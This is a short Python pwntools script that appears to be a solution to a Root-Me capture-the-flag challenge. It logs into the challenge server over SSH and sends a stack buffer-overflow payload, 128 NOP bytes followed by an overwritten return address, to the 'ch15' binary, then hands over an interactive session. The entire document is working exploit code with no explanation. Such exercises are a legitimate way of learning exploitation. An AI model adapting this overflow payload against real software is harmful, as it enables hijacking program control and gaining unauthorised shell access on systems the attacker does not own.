#!/usr/bin/env python3
from pwn import *
conn = ssh(host="challenge02.root-me.org", port=2222, user="app-systeme-ch15", password="app-systeme-ch15")
payload = b'\x90' * 128 
payload += p32(0x8048516)
proc = conn.process(["./ch15","./ch15"])
proc.sendline(payload)
proc.interactive()
